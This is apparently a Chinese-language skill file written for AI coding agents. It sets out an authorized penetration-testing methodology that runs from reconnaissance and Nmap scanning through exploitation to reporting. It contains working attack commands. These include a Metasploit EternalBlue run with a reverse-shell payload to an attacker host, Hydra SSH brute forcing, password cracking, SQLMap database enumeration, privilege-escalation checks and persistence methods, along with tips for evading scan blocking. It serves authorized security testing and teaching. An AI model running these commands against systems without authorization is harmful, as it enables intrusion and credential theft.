---
name: penetration-testing-methodology
title: 渗透测试全生命周期
description: 当在授权范围内对目标系统做安全评估、需要一套从信息收集到报告的端到端渗透方法论时使用；按侦察→扫描→漏洞分析→利用→权限维持→报告的阶段推进，产出侦察清单、漏洞评估、PoC 证据与含风险分级的最终报告；不适用于无书面授权的测试、超范围攻击或恶意入侵。触发词：渗透测试、漏洞评估、Kali/Nmap/Metasploit、安全评估报告。
domain: 安全/audit
triggers: [渗透测试, 漏洞评估, 安全评估, Kali Linux, Nmap 扫描, Metasploit, 提权, 渗透测试报告, OWASP 测试, 授权安全测试]
tags: [安全, 渗透测试, misc, 红队, 漏洞评估, 方法论]
level: 进阶
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [Nmap, theHarvester, Nikto, Gobuster, Metasploit, SQLMap, Hydra, John the Ripper, LinPEAS/WinPEAS]
requires: []
related: [red-team-recon, cloud-penetration-testing, linux-privilege-escalation, active-directory-attacks]
combines_with: [red-team-recon, burp-suite-testing, security-audit-toolkit]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
> 仅限授权使用：本技能仅可用于已获书面授权的渗透测试、防御性验证或受控教学环境。任何无授权、超范围的测试均属违法。

## 何时使用

适用于以下场景：
- 已取得系统所有者**书面授权**，需要对目标做端到端的渗透/安全评估。
- 需要一套可复用的阶段化方法论（侦察→扫描→漏洞分析→利用→权限维持→报告）来组织工作并交付证据。
- 防御方做漏洞复现验证，或在隔离靶场做教学演练。

**不该用（负边界）：**
- 没有书面授权、或目标不在授权范围内 —— 任何操作前先确认 scope 与 rules of engagement。
- 生产环境上未经审批的破坏性操作（DoS、删改数据、留后门）。
- 把测试中获取的数据/凭据用于个人目的或对外披露。
- 仅需写一份安全策略文档、做合规审计或代码审计 —— 那属于其他技能范畴。

**前置条件**：基础网络与 Linux 命令行能力、Web 技术常识；一套测试平台（如 Kali Linux）与到授权目标的网络可达性。

## 步骤

1. **侦察（被动为主）**：不直接接触目标，收集域名、子域、邮箱、技术栈、人员等情报，产出侦察清单。
2. **扫描（主动枚举）**：探活、端口扫描、服务识别，绘制攻击面。
3. **漏洞分析**：结合自动化扫描与手工验证，对照 OWASP/CVE 定位可利用弱点，产出漏洞评估。
4. **利用**：在授权与范围内验证漏洞可被利用，留存最小化的 PoC 证据（截图、请求/响应、命令输出）。
5. **权限维持/提权（受控）**：仅在授权允许时演示持久化与提权，全程记录，测试后清理所有植入物。
6. **报告**：按执行摘要 + 技术发现 + 风险分级 + 修复建议 + 附录结构交付最终报告。

全程原则：能被动则不主动、能只读则不写、所有动作可追溯、不做计划外测试。

## 指令

**阶段一 · 侦察（被动）**
```bash
# WHOIS 与 DNS 枚举
whois target.com
dig target.com ANY; dig target.com MX; dig target.com NS
dnsrecon -d target.com          # 子域发现
theHarvester -d target.com -b all   # 邮箱/资产收集
```
Google Hacking（OSINT）常用语法：
```
site:target.com filetype:pdf        # 暴露的文件
site:target.com inurl:admin         # 后台/登录页
site:target.com intitle:"index of"  # 目录列表
site:target.com filetype:env        # 配置/密钥泄露
```
社媒侦察：LinkedIn（组织架构/技术栈）、招聘信息（技术栈）、Twitter/Facebook（人员信息）。

**阶段二 · 扫描**
```bash
nmap -sn 192.168.1.0/24         # 探活（ping sweep）
nmap -sS target.com             # SYN 半开扫描（隐蔽）
nmap -p- target.com             # 全端口
nmap -sV target.com             # 服务/版本识别
nmap -A target.com              # 激进：OS+版本+脚本
nmap --script=vuln target.com   # 漏洞脚本
```
常见端口速查：21 FTP、22 SSH、23 Telnet、25 SMTP、53 DNS、80 HTTP、443 HTTPS、445 SMB、3306 MySQL、3389 RDP。

**阶段三 · 漏洞分析**
```bash
nikto -h http://target.com      # Web 漏洞扫描
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt  # 目录爆破
whatweb target.com              # 技术指纹
```
Web 重点（OWASP）：SQL 注入、XSS、失效的认证/访问控制、安全配置错误、敏感数据暴露、XXE、不安全反序列化、已知漏洞组件、日志监控不足。

**阶段四 · 利用**
```bash
# Metasploit
msfconsole
msf> search type:exploit name:smb
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS target.com
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip
msf> exploit

# 口令攻击
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# SQL 注入
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
```

**阶段五 · 权限维持/提权（受控，须授权）**
```bash
# 提权枚举
linpeas.sh / winpeas.exe
find / -perm -4000 2>/dev/null   # SUID 二进制
sudo -l                          # sudo 权限
```
持久化（仅在授权允许时演示，测试后必须清理）：Meterpreter persistence、SSH authorized_keys、cron 任务。**伦理语境下的「清理痕迹」= 记录全部动作、保留日志供报告、移除测试文件与后门、不做不必要的系统改动。**

## 示例

授权内网评估的最小闭环：
1. 侦察：`theHarvester -d acme.com -b all` 收集邮箱与子域，记录到侦察清单。
2. 扫描：`nmap -sV -p- 10.0.0.0/24`，发现 10.0.0.5 开放 445/SMB。
3. 分析：`nmap --script=vuln 10.0.0.5` 提示疑似 MS17-010。
4. 利用：Metasploit 加载 `ms17_010_eternalblue`，设好 RHOSTS/LHOST 后 `exploit`，获取会话并**截图留证**。
5. 报告：将该项判为 Critical（需立即处置），给出补丁/隔离建议，证据归入技术发现章节。

风险分级参考：Critical 立即处置｜High 24-48h｜Medium 一周内｜Low 一月内｜Informational 最佳实践建议。

## 注意事项

- **授权先行**：无书面授权不测试；严格不越界；发现越权访问迹象立即上报。
- **范围与规则**：遵守 rules of engagement，只执行计划内测试，不做计划外动作。
- **证据与保密**：完整记录方法与时间线，所有发现仅向客户披露，对访问到的数据保密。
- **最小破坏**：避免不必要的系统损坏；测试结束清理后门、测试文件与临时配置。
- **故障排查**：扫描被拦 → 降速、换技术、用代理/VPN、分片报文；利用失败 → 先核实漏洞确实存在、检查 payload 兼容性、调参或换备选 exploit。

## 互见

- 报告与风险分级章节可衔接「漏洞披露 / 修复跟踪」类技能。
- Web 专项（SQL 注入、XSS、访问控制）可下钻到对应的 OWASP 测试技能。
- 平台搭建（Kali 硬盘安装 / Live USB 持久化，如 `dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress`）可参见环境配置类技能。

---
采编自 sickn33/antigravity-awesome-skills（原 skill：ethical-hacking-methodology，作者 zebbern，MIT 许可）。
